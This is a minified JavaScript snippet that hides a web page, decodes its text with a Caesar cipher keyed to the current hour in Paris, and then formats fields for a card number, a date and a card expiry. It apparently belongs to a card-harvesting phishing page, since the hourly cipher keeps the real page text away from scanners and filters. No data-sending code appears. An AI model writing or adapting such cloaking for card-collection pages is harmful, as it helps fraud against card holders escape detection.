function decodeText(text){const options={timeZone:'Europe/Paris',hour12:!1,hour:'numeric'};const hourInParis=new Intl.DateTimeFormat('en-US',options).format(new Date());const key=String(hourInParis%12||12).padStart(2,'0');return text.replace(/[a-zA-Z]/g,char=>{const ascii=char.charCodeAt(0);const base=char.match(/[A-Z]/)?65:97;return String.fromCharCode((ascii-base-key+26)%26+base)})}
function decodeNode(node){if(node.nodeType===Node.TEXT_NODE){node.textContent=decodeText(node.textContent)}else if(node.nodeType===Node.ELEMENT_NODE){if(!['SCRIPT','STYLE'].includes(node.tagName)){node.childNodes.forEach(child=>decodeNode(child))}}}
function areAllElementsLoaded(){const images=document.getElementsByTagName('img');for(let i=0;i<images.length;i++){if(!images[i].complete){return!1}}
return!0}
function startDecoding(){if(areAllElementsLoaded()){decodeNode(document.body);document.body.style.visibility='visible';$('.js-number').mask('0000 0000 0000 0000');$('.js-date').mask('00/00/0000');$('.js-exp').mask('00/00')}}
document.addEventListener('DOMContentLoaded',function(){document.body.style.visibility='hidden';startDecoding()});window.addEventListener('load',function(){setTimeout(function(){if(document.body.style.visibility==='hidden'){console.warn('Forced decoding after timeout');decodeNode(document.body);document.body.style.visibility='visible';$('.js-number').mask('0000 0000 0000 0000');$('.js-date').mask('00/00/0000');$('.js-exp').mask('00/00')}},100)})